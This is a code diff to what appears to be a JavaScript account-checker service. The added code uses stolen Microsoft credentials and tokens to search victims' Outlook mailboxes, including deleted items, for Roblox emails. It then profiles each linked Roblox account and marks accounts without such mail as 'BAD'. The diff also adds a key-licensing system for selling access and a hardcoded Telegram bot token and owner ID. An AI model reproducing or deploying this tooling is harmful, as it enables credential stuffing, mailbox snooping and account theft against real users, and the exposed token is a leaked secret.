@@ -3,6 +3,10 @@
  * Exact match to hatmil.py working logic
  */
 
+// Owner configuration
+const OWNER_ID = '5028065177';
+const BOT_TOKEN = '8772848240:AAElUPRV3veb84o8X-VX-OIuGU7yxq74h3Q';
+
 export default async function handler(req, res) {
   res.setHeader('Content-Type', 'application/json');
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -36,6 +40,16 @@ export default async function handler(req, res) {
         return await telegramSendText(input, res);
       case 'telegram_document':
         return await telegramSendDocument(input, res);
+      case 'generate_key':
+        return await generateKey(input, res);
+      case 'list_keys':
+        return await listKeys(input, res);
+      case 'ban_user':
+        return await banUser(input, res);
+      case 'get_stats':
+        return await getStats(input, res);
+      case 'handle_bot_update':
+        return await handleBotUpdate(input, res);
       default:
         return res.json({ error: 'Unknown action: ' + action });
     }
@@ -359,6 +373,23 @@ async function doCheck(input, res) {
       result.minecraft_uuid = mcResult.minecraft_uuid || '';
     }
 
+    // Check Roblox
+    if (['roblox', 'both', 'all'].includes(checkMode)) {
+      const rbResult = await checkRoblox(email, accessToken, cid, sessionCookies);
+      if (rbResult.roblox_status === 'FOUND' && rbResult.roblox_username) {
+        result.roblox_status = 'FOUND';
+        result.roblox_username = rbResult.roblox_username;
+        result.roblox_friends = rbResult.roblox_friends || 0;
+        result.roblox_banned = rbResult.roblox_banned || 'No';
+        result.roblox_created = rbResult.roblox_created || 'Unknown';
+        result.roblox_profile = rbResult.roblox_profile || '';
+        result.roblox_wearing = rbResult.roblox_wearing || [];
+      } else {
+        // No Roblox capture - return BAD status
+        return res.json({ status: 'BAD' });
+      }
+    }
+
     return res.json(result);
 
   } catch (e) {
@@ -537,6 +568,238 @@ async function checkMinecraft(accessToken) {
   return { minecraft_status: 'FREE', minecraft_username: null };
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// ROBLOX CHECK - Match Python logic exactly
+// ─────────────────────────────────────────────────────────────────────────────
+
+// Extract Roblox username from search text (ERUU function)
+function extractRobloxUsername(searchText) {
+  const patterns = [
+    /account:\s*([a-zA-Z0-9_]+)/i,
+    /for\s+([a-zA-Z0-9_]+)\s+and\s+want/i,
+    /account:\s*([a-zA-Z0-9_]+)\./i,
+    /for\s+([a-zA-Z0-9_]+)\.\s+If/i
+  ];
+  
+  for (const pattern of patterns) {
+    const match = searchText.match(pattern);
+    if (match) {
+      return match[1];
+    }
+  }
+  return null;
+}
+
+// Get Roblox user ID from username (GIDD function)
+async function getRobloxUserId(username) {
+  try {
+    const url = 'https://users.roblox.com/v1/usernames/users';
+    const payload = { usernames: [username], excludeBannedUsers: false };
+    const r = await sessionRequest(url, 'POST', 
+      { 'Content-Type': 'application/json' },
+      JSON.stringify(payload), {}, true);
+    
+    if (r.status === 200) {
+      const data = JSON.parse(r.text);
+      if (data.data && data.data.length > 0) {
+        return data.data[0].id;
+      }
+    }
+  } catch {}
+  return null;
+}
+
+// Get Roblox asset names (GSNN function)
+async function getRobloxAssetNames(assetIds) {
+  if (!assetIds || assetIds.length === 0) return [];
+  
+  try {
+    // First get CSRF token
+    const tokenUrl = 'https://catalog.roblox.com/v1/catalog/items/details';
+    const tokenRes = await sessionRequest(tokenUrl, 'POST',
+      { 'Content-Type': 'application/json' },
+      JSON.stringify({ items: [] }), {}, true);
+    
+    const csrfToken = tokenRes.headers.get ? tokenRes.headers.get('x-csrf-token') : null;
+    if (!csrfToken) return [];
+    
+    const items = assetIds.map(aid => ({ itemType: 'Asset', id: parseInt(aid) }));
+    const headers = { 
+      'Content-Type': 'application/json',
+      'x-csrf-token': csrfToken
+    };
+    
+    const r = await sessionRequest(tokenUrl, 'POST', headers,
+      JSON.stringify({ items: items }), {}, true);
+    
+    if (r.status === 200) {
+      const data = JSON.parse(r.text);
+      return (data.data || []).map(item => item.name || 'Unknown Item');
+    }
+  } catch {}
+  return [];
+}
+
+// Full Roblox user lookup (RLLL function)
+async function getRobloxUserData(username) {
+  const result = {
+    username: username,
+    friends: 0,
+    banned: 'No',
+    created: 'Unknown',
+    profile: '',
+    wearing: []
+  };
+  
+  const userId = await getRobloxUserId(username);
+  if (!userId) return null;
+  
+  try {
+    // Get user info
+    const userUrl = `https://users.roblox.com/v1/users/${userId}`;
+    const userRes = await sessionRequest(userUrl, 'GET', {}, null, {}, true);
+    if (userRes.status === 200) {
+      const userData = JSON.parse(userRes.text);
+      result.banned = userData.isBanned ? 'Yes' : 'No';
+      const createdRaw = userData.created || '';
+      result.created = createdRaw.split('T')[0] || 'Unknown';
+    }
+    
+    // Get friends count
+    const friendsUrl = `https://friends.roblox.com/v1/users/${userId}/friends/count`;
+    const friendsRes = await sessionRequest(friendsUrl, 'GET', {}, null, {}, true);
+    if (friendsRes.status === 200) {
+      const friendsData = JSON.parse(friendsRes.text);
+      result.friends = friendsData.count || 0;
+    }
+    
+    result.profile = `https://www.roblox.com/users/${userId}/profile`;
+    
+    // Get currently wearing
+    const wearingUrl = `https://avatar.roblox.com/v1/users/${userId}/currently-wearing`;
+    const wearingRes = await sessionRequest(wearingUrl, 'GET', {}, null, {}, true);
+    if (wearingRes.status === 200) {
+      const wearingData = JSON.parse(wearingRes.text);
+      const assetIds = wearingData.assetIds || [];
+      result.wearing = await getRobloxAssetNames(assetIds);
+    }
+    
+    return result;
+  } catch {
+    return null;
+  }
+}
+
+// Main Roblox check function
+async function checkRoblox(email, accessToken, cid, sessionCookies) {
+  await sleep(0.5);
+  
+  const searchUrl = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124';
+  
+  const searchPayload = {
+    Cvid: generateUUID(),
+    Scenario: { Name: 'owa.react' },
+    TimeZone: 'United Kingdom Standard Time',
+    TextDecorations: 'Off',
+    EntityRequests: [{
+      EntityType: 'Conversation',
+      ContentSources: ['Exchange'],
+      Filter: {
+        Or: [
+          { Term: { DistinguishedFolderName: 'msgfolderroot' } },
+          { Term: { DistinguishedFolderName: 'DeletedItems' } }
+        ]
+      },
+      From: 0,
+      Query: { QueryString: 'no-reply@roblox.com' },
+      RefiningQueries: null,
+      Size: 25,
+      Sort: [
+        { Field: 'Score', SortDirection: 'Desc', Count: 3 },
+        { Field: 'Time', SortDirection: 'Desc' }
+      ],
+      EnableTopResults: true,
+      TopResultsCount: 3
+    }],
+    AnswerEntityRequests: [{
+      Query: { QueryString: 'Playstation Sony' },
+      EntityTypes: ['Event', 'File'],
+      From: 0,
+      Size: 100,
+      EnableAsyncResolution: true
+    }],
+    QueryAlterationOptions: {
+      EnableSuggestion: true,
+      EnableAlteration: true,
+      SupportedRecourseDisplayTypes: [
+        'Suggestion', 'NoResultModification',
+        'NoResultFolderRefinerModification', 'NoRequeryModification', 'Modification'
+      ]
+    },
+    LogicalId: generateUUID()
+  };
+  
+  const searchHeaders = {
+    'User-Agent': 'Outlook-Android/2.0',
+    'Pragma': 'no-cache',
+    'Accept': 'application/json',
+    'ForceSync': 'false',
+    'Authorization': `Bearer ${accessToken}`,
+    'X-AnchorMailbox': `CID:${cid}`,
+    'Host': 'substrate.office.com',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'Content-Type': 'application/json'
+  };
+  
+  const r = await sessionRequest(searchUrl, 'POST', searchHeaders, 
+    JSON.stringify(searchPayload), sessionCookies, true);
+  
+  if (r.status === 400) {
+    return { roblox_status: 'RETRY' };
+  }
+  
+  if (r.status !== 200) {
+    return { roblox_status: 'FREE' };
+  }
+  
+  const searchText = r.text;
+  const robloxUser = extractRobloxUsername(searchText);
+  
+  // Extract Total count
+  let total = '0';
+  const totalStart = searchText.indexOf('"Total":');
+  if (totalStart !== -1) {
+    const valueStart = totalStart + '"Total":'.length;
+    let valueEnd = searchText.indexOf(',', valueStart);
+    if (valueEnd === -1) {
+      valueEnd = searchText.indexOf('}', valueStart);
+    }
+    if (valueEnd !== -1) {
+      total = searchText.substring(valueStart, valueEnd).trim();
+    }
+  }
+  
+  // Only return FOUND if Total != "0" AND we have a roblox_user
+  if (total !== '0' && robloxUser) {
+    const robloxData = await getRobloxUserData(robloxUser);
+    if (robloxData) {
+      return {
+        roblox_status: 'FOUND',
+        roblox_username: robloxData.username,
+        roblox_friends: robloxData.friends,
+        roblox_banned: robloxData.banned,
+        roblox_created: robloxData.created,
+        roblox_profile: robloxData.profile,
+        roblox_wearing: robloxData.wearing
+      };
+    }
+  }
+  
+  // No Roblox capture - return FREE (will be treated as BAD by caller)
+  return { roblox_status: 'FREE' };
+}
+
 async function checkMicrosoftSubscriptions(email, password, accessToken, cid, sessionCookies) {
   await sleep(0.5);
 
@@ -653,6 +916,76 @@ async function checkMicrosoftSubscriptions(email, password, accessToken, cid, se
 // ─────────────────────────────────────────────────────────────────────────────
 // TELEGRAM HELPERS
 // ─────────────────────────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// KEY MANAGEMENT API FUNCTIONS
+// ─────────────────────────────────────────────────────────────────────────────
+const KeyDB = {
+  keys: new Map(),
+  bannedUsers: new Set()
+};
+
+async function generateKey(input, res) {
+  const { duration, ownerId } = input;
+  if (ownerId !== OWNER_ID) {
+    return res.json({ error: "Unauthorized" });
+  }
+  
+  const keyId = Math.random().toString(36).substring(2, 10);
+  const key = `KEY-${Math.random().toString(36).substring(2, 8).toUpperCase()}-${Date.now().toString(36).toUpperCase()}`;
+  const now = new Date();
+  const expiresAt = parseDuration(duration || "24h", now);
+  
+  const keyData = {
+    id: keyId,
+    key: key,
+    createdAt: now.toISOString(),
+    expiresAt: expiresAt.toISOString(),
+    duration: duration || "24h"
+  };
+  
+  KeyDB.keys.set(keyId, keyData);
+  return res.json(keyData);
+}
+
+function parseDuration(duration, fromDate) {
+  const match = duration.match(/^(\d+)(h|d|m)$/i);
+  if (!match) throw new Error("Invalid duration");
+  const value = parseInt(match[1]);
+  const unit = match[2].toLowerCase();
+  const result = new Date(fromDate);
+  switch (unit) {
+    case "h": result.setHours(result.getHours() + value); break;
+    case "d": result.setDate(result.getDate() + value); break;
+    case "m": result.setMonth(result.getMonth() + value); break;
+  }
+  return result;
+}
+
+async function listKeys(input, res) {
+  const keys = Array.from(KeyDB.keys.values());
+  return res.json({ keys });
+}
+
+async function banUser(input, res) {
+  const { userId, ownerId } = input;
+  if (ownerId !== OWNER_ID) {
+    return res.json({ error: "Unauthorized" });
+  }
+  KeyDB.bannedUsers.add(String(userId));
+  return res.json({ ok: true });
+}
+
+async function getStats(input, res) {
+  const keys = Array.from(KeyDB.keys.values());
+  const activeKeys = keys.filter(k => new Date(k.expiresAt) > new Date()).length;
+  return res.json({
+    totalKeys: keys.length,
+    activeKeys,
+    bannedUsers: KeyDB.bannedUsers.size,
+    stats: { totalChecks: 0, totalHits: 0 }
+  });
+}
+
 async function telegramSendMessage(input, res) {
   const token = input.token || '';
   const chatId = input.chatId || '';
@@ -755,6 +1088,24 @@ async function telegramSendDocument(input, res) {
     return res.json({ ok: resp.ok || false });
   } catch (e) {
     console.error('Telegram document error:', e);
+    return res.json({ ok: false, error: e.message });
+  }
+}
+// ─────────────────────────────────────────────────────────────────────────────
+// BOT UPDATE HANDLER - Proxy to bot.js
+// ─────────────────────────────────────────────────────────────────────────────
+async function handleBotUpdate(input, res) {
+  const update = input.update;
+  
+  // Forward to bot.js handler
+  try {
+    const botHandler = await import("./bot.js");
+    return await botHandler.default({ 
+      method: "POST", 
+      body: { action: "handle_update", update } 
+    }, res);
+  } catch (e) {
+    console.error("Bot handler error:", e);
     return res.json({ ok: false, error: e.message });
   }
 }
